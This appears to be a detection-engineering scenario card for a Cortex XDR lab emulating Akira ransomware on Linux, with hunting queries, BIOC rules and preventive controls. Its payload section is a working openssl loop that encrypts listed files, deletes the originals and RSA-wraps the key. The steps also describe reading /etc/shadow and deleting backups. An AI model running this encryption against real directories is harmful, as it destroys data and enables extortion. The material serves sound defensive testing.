identity.name: Akira (Howling Scorpius) Linux-Host Kill Chain — Real On-Host File Encryption
identity.summary: An Akira operator, landed via a stolen remote session and running as root, evades defenses, reads /etc/shadow and SSH keys, stages a company share, then REALLY encrypts a synthetic victim tree with openssl AES-256 under an RSA-wrapped key, appends the .akira extension, drops the akira_readme.txt note and deletes staged backups — raising the built-in 'Suspicious data encryption' Analytics BIOC.
identity.description: The on-host Linux variant of Akira (Unit 42 Howling Scorpius, 2024-12-02), distinct from the vCenter->ESXi hypervisor path (SIM-EDR-019) and from the SAFE-MODE non-encrypting host variant (SIM-EDR-008). It executes for real on a bare Ubuntu host against a synthetic tree under /var/tmp/.cortexsim-akira — never real user data — and cleans up fully. Only two detections are declared because only two fire on the lab agent's own judgement, both built-in XDR Analytics BIOCs and both Low, so neither creates or joins a case: 'Suspicious access to shadow file' (proven on pov-target-01 2026-11-11) on the /etc/shadow read, and 'Suspicious data encryption' (observed on pov-target-01 2026-11-11 in report mode) on the openssl encryption. The BTP mass-encryption Prevention raised nothing in that run and stays on this card undeclared until product question PM-PRV-07 says what makes Linux BTP act. The host-mass-encryption BIOCs, the hunt XQL and the Akira IOCs on this card are hunting / TIM content, NOT declared scenario expectations, because the lab tenant shows 0 queryable custom BIOCs and a declared-but-unfirable detection scores a working tenant as a miss.

campaigns: Akira / Akira_v2 double-extortion ransomware (RaaS), Linux and ESXi encryptors

execution.framework_reference_id: SIM-EDR-025 — six root-run steps delivered by the CortexSim beacon (40 s apart); scenarios/edr/edr-025-akira-howling-scorpius-linux-host-encryption.yml is the delivery path.

prerequisites.description: Cortex XDR agent on the Linux endpoint reporting to a tenant with the built-in Analytics BIOCs enabled (lab: 9.4.0.470 on Ubuntu, report-mode malware policy).
openssl, tar, findmnt and systemd present (all on a stock Ubuntu base).
Writable /var/tmp with execute permission; the scenario stages and encrypts ONLY under /var/tmp/.cortexsim-akira.

payload.code:
# NOT A SUBSTITUTE FOR THE SCENARIO: scenarios/edr/edr-025-akira-howling-scorpius-linux-host-encryption.yml is the delivery path (six steps, 40 s apart). Illustrative impact leg only:
D=/var/tmp/.cortexsim-akira
openssl genrsa -out "$D/.keys/attacker_rsa.key" 2048
openssl rsa -in "$D/.keys/attacker_rsa.key" -pubout -out "$D/.keys/attacker_rsa.pub"
AESKEY=$(openssl rand -hex 32)
while IFS= read -r f; do openssl enc -aes-256-cbc -pbkdf2 -salt -in "$f" -out "$f.akira" -pass "pass:$AESKEY" && rm -f "$f"; done < "$D/targets.list"
printf '%s' "$AESKEY" | openssl pkeyutl -encrypt -pubin -inkey "$D/.keys/attacker_rsa.pub" -out "$D/akira_wrapped.key"

expected_artifacts.description: An unpopular process opens /etc/shadow (read-only credential access).
openssl encrypts each staged file to <file>.akira under the hidden victim tree.
Mass file creation with the uniform .akira extension and akira_readme.txt notes.
Staged backup deletion (recovery inhibition) immediately after encryption.

cleanup.code:
systemctl disable --now cortexsim-decoy.service >/dev/null 2>&1 || true
rm -f /etc/systemd/system/cortexsim-decoy.service
systemctl daemon-reload >/dev/null 2>&1 || true
rm -rf /var/tmp/.cortexsim-akira

prevention_modules.name: Behavioral Threat Mass Encryption
prevention_modules.description: UNDECLARED: SIM-EDR-025 does not reference this entry. The Cortex XDR agent's Global Behavioral Threat Protection acting on the real AES mass-encryption with a uniform .akira extension and a ransom note dropped across directories (Linux has no Ransomware Protection module). On pov-target-01 2026-11-11, in report mode, openssl encrypting about 40 files under /var/tmp raised no behavioral threat issue (docs/lab/2026-11-11-unit42-deep-real-verification.md). What makes Linux BTP act (file count, rate, path, extension rewrite, ransom note or the encrypting binary) and whether it raises anything in report mode is open product question PM-PRV-07. A Prevention row is seeded into every run, and a report-mode run scores even an outcome: prevent row as a detect, so declaring it today would score a working tenant a miss. The alert_name_pattern is unconfirmed.

abiocs.name: Suspicious access to shadow file
abiocs.description: PANW built-in XDR Analytics BIOC (Low; Low issues never create or join a case). The same built-in was observed on pov-target-01 2026-11-11 (issues 1500417, 1500418) on useradd and chpasswd, mapped by the tenant to T1003. The name is the built-in alert name verbatim so the matcher keys on it. In SIM-EDR-025 the reader is `cat` — a distinct unpopular process opening /etc/shadow. The logic below approximates the trigger for hunting; it is not the built-in's code. Rarity-judged: it may read missed where this process/file pair is already baselined on the host.
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.FILE and event_sub_type = ENUM.FILE_OPEN
| filter action_file_path = "/etc/shadow"
| filter actor_process_image_name in ("cat", "less", "more", "head", "tail", "cp", "dd", "python3", "perl")
abiocs.causality_anchor: The unpopular process opening /etc/shadow (here cat) and its causality chain; how rarely that process touches shadow across the tenant decides whether it fires.

abiocs.name: Suspicious data encryption
abiocs.description: PANW built-in XDR Analytics BIOC (Low; Low issues never create or join a case). Observed on pov-target-01 2026-11-11 in report mode (SIM-EDR-025 run 46f4394b, rule_id 30df8779-1e1e-4c5a-a9de-40cb94d837e7) one second after the openssl burst, described by the tenant as 'The process openssl used to encrypt data on the local file system' and mapped to T1486 and T1027.013, with case_ids empty. The name is the built-in alert name verbatim so the matcher keys on it. Severity is the rule's, not the policy's, so it is Low in block mode too. The logic below approximates the trigger for hunting; it is not the built-in's code.
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "openssl"
| filter action_process_image_command_line contains " enc "
abiocs.causality_anchor: The openssl process encrypting local files and its causality chain (in the lab, the root operator shell under the CortexSim beacon).

biocs.name: EDR-025 Rapid Mass File Rewrite With Uniform Akira Extension
biocs.description: Hunting / operator-installable content (NOT a declared SIM-EDR-025 expectation — the lab tenant has 0 queryable custom BIOCs). One process creates many files that all take a single new extension while deleting the originals — the encryptor fingerprint. If installed in a tenant, create it with EXACTLY this name at Medium. CortexSim never writes it to the tenant. Category: impact.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE)
| filter action_file_path ~= "[.]akira(new|ranges)?$"
| comp count() as encrypted_files, count_distinct(action_file_path) as distinct_paths by agent_hostname, actor_causality_id, causality_actor_process_image_name
| filter encrypted_files >= 10

biocs.name: EDR-025 Akira Ransom Note Written Across Directories
biocs.description: Hunting / operator-installable content (NOT a declared SIM-EDR-025 expectation). The same causality chain drops the Akira ransom note into multiple directories. If installed, create it with EXACTLY this name at Medium. CortexSim never writes it to the tenant. Category: impact.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE)
| filter action_file_name in ("akira_readme.txt", "akiranew.txt", "powerranges.txt")
| comp count_distinct(action_file_directory) as dirs by agent_hostname, actor_causality_id
| filter dirs >= 2

biocs.name: EDR-025 Backup Deletion Co-Occurring With Mass Encryption
biocs.description: Hunting / operator-installable content (NOT a declared SIM-EDR-025 expectation). rm removing backup/snapshot artefacts — recovery inhibition that the correlation fuses with the encryption on the same host. If installed, create it with EXACTLY this name at Medium. CortexSim never writes it to the tenant. Category: impact.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name in ("rm", "shred", "unlink")
| filter action_process_image_command_line ~= "(backup|snapshot|[.]img|[.]bak)"

xql_queries.name: EDR-025 Mass Akira-Extension Encryption By One Causality Chain
xql_queries.query:
dataset = xdr_data
| filter timestamp_diff(current_time(), _time, "SECOND") < 3600
| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE)
| filter action_file_path ~= "[.]akira(new|ranges)?$"
| comp count() as encrypted_files, min(_time) as first_file, max(_time) as last_file by agent_hostname, agent_id, actor_causality_id, causality_actor_process_image_name
| filter encrypted_files >= 10
| fields agent_hostname, agent_id, actor_causality_id, causality_actor_process_image_name, encrypted_files, first_file, last_file

xql_queries.name: EDR-025 openssl Symmetric Encryption Of The Staged Victim Tree
xql_queries.query:
dataset = xdr_data
| filter timestamp_diff(current_time(), _time, "SECOND") < 3600
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "openssl"
| filter action_process_image_command_line contains "enc -aes-256-cbc" and action_process_image_command_line contains ".akira"
| fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, action_process_image_command_line

xql_queries.name: EDR-025 Shadow Read Then Mass Encryption On One Host
xql_queries.query:
dataset = xdr_data
| filter timestamp_diff(current_time(), _time, "SECOND") < 3600
| alter leg = if(event_type = ENUM.FILE and event_sub_type = ENUM.FILE_OPEN and action_file_path = "/etc/shadow", "shadow", if(event_type = ENUM.FILE and action_file_path ~= "[.]akira(new|ranges)?$", "encrypt", "other"))
| filter leg in ("shadow", "encrypt")
| comp count_distinct(leg) as legs, count() as events by agent_hostname, agent_id
| filter legs >= 2

correlation_rules.name: EDR-025 Akira Linux Host Encryption With Recovery Inhibition
correlation_rules.logic:
Hunting / operator-installable correlation (NOT a declared SIM-EDR-025 expectation; CortexSim never writes it). If installed: alert name EXACTLY as this rule's name; severity High; Scheduled, every 10 minutes, query time frame 1 hour; alert field mapping: agent_hostname -> Host Name, agent_id -> Agent ID. XQL:
dataset = xdr_data
| filter agent_os_type = ENUM.AGENT_OS_LINUX
| filter timestamp_diff(current_time(), _time, "SECOND") < 3600
| alter leg = if(event_type = ENUM.FILE and action_file_path ~= "[.]akira(new|ranges)?$", "encrypt", if(event_type = ENUM.FILE and action_file_name in ("akira_readme.txt", "akiranew.txt", "powerranges.txt"), "note", if(event_type = ENUM.PROCESS and action_process_image_name in ("rm", "shred", "unlink") and action_process_image_command_line ~= "(backup|snapshot|[.]img|[.]bak)", "recovery", "other")))
| filter leg in ("encrypt", "note", "recovery")
| comp count_distinct(leg) as legs, count() as events, min(_time) as first_seen, max(_time) as last_seen by agent_hostname, agent_id
| filter legs >= 2

analytics_modules: Not declared: beyond the built-in 'Suspicious access to shadow file' and 'Suspicious data encryption' ABIOCs, no multi-event baseline XDR Analytics alert has been observed on this endpoint for this chain, so none is an expectation.

products.evidence_query: Undeclared (PM-PRV-07): an issue from Global Behavioral Threat Protection on the openssl mass-encryption. None was raised in report mode on pov-target-01 2026-11-11.
Issues 'Suspicious access to shadow file' on the cat read of /etc/shadow and 'Suspicious data encryption' on the openssl encryption (both detection.method ANALYTICS_BIOC, Low).

No declared detection carries a case_id: both are Low Analytics BIOCs, and a Low issue never creates or joins a case (lab 2026-11-11: the encryption BIOC had case_ids []). Hunting correlation CR-EDR-0025 groups encrypt/note/recovery legs on one host if installed.

threat_scenarios.name: Akira Linux-Host Kill Chain Terminating In Real File Encryption
threat_scenarios.description: Evade defenses, steal local credentials, enumerate and stage a share, encrypt for real with an RSA-wrapped AES key, inhibit recovery — and prove Cortex XDR raises the built-in 'Suspicious data encryption' Analytics BIOC on the real encryption and the shadow-access ABIOC on the credential read.

threat_steps.objective: The credential read raises the built-in shadow-access ABIOC.
preconditions: Linux endpoint with the Cortex agent; the staged victim tree present.
success_criteria: ABIOC 'Suspicious access to shadow file' (Low) fires on the cat read.

threat_steps.objective: The real encryption raises the built-in 'Suspicious data encryption' Analytics BIOC.
preconditions: Linux endpoint with the Cortex agent; built-in Analytics BIOCs enabled.
steps: Enumerate and stage the company share.
AES-256-encrypt each file to .akira under an RSA-wrapped key and drop the note.
success_criteria: Analytics BIOC 'Suspicious data encryption' (Low, T1486) fires on the openssl encryption.

preventive_controls: Set Global Behavioral Threat Protection Rules to Block in the Linux malware profile. Linux has no Ransomware Protection module (Windows/macOS only); on Linux, mass encryption is stopped by Global Behavioral Threat Protection Rules.
Restrict and monitor read access to /etc/shadow and private SSH keys.
Keep immutable, offline or object-locked backups so recovery inhibition cannot reach them.
detection_engineering: The declared impact detection is the built-in 'Suspicious data encryption' Analytics BIOC (Low, no case). The agent's behavioral verdict on the encryption stays undeclared until PM-PRV-07 says what makes Linux BTP act; a filename rule is hunting content.
Do not over-declare: the lab tenant has 0 queryable custom BIOCs, so the mass-encryption BIOCs and CR-EDR-0025 are hunting content, not scored expectations.
Hunt XQL uses actor_causality_id and timestamp_diff(current_time(), _time, "SECOND") — bare causality_id and to_timestamp(current_time() - N) are rejected by the tenant.
